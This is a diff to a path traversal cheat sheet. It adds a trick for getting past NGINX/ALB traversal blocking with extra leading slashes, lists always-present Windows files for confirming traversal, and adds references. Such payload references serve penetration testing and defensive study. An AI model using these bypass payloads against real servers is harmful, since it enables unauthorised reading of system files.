@@ -12,6 +12,7 @@
     * [Bypass "../" with ";"](#bypass--with-)
     * [Double URL encoding](#double-url-encoding)
     * [UNC Bypass](#unc-bypass)
+    * [NGINX/ALB Bypass](#nginxalb-bypass)
 * [Path Traversal](#path-traversal)
     * [Interesting Linux files](#interesting-linux-files)
     * [Interesting Windows files](#interesting-windows-files)
@@ -89,6 +90,14 @@ An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software 
 \\localhost\c$\windows\win.ini
 ```
 
+### NGINX/ALB Bypass
+
+NGINX in certain configurations and ALB can block traversal attacks in the route, For example:
+```http://nginx-server/../../``` will return a 400 bad request.
+
+To bypass this behaviour just add forward slashes in front of the url:
+```http://nginx-server////////../../```
+
 
 ## Path Traversal
 
@@ -122,6 +131,14 @@ An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software 
 ```
 
 ### Interesting Windows files
+
+Always existing file in recent Windows machine. 
+Ideal to test path traversal but nothing much interesting inside...
+
+```powershell
+c:\windows\system32\license.rtf
+c:\windows\system32\eula.txt
+```
 
 Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)
 
@@ -167,5 +184,7 @@ The following log files are controllable and can be included with an evil payloa
 
 ## References
 
+* [Path Traversal Cheat Sheet: Windows](https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
 * [Directory traversal attack - Wikipedia](https://en.wikipedia.org/wiki/Directory_traversal_attack)
 * [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
+* [NGINX may be protecting your applications from traversal attacks without you even knowing](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
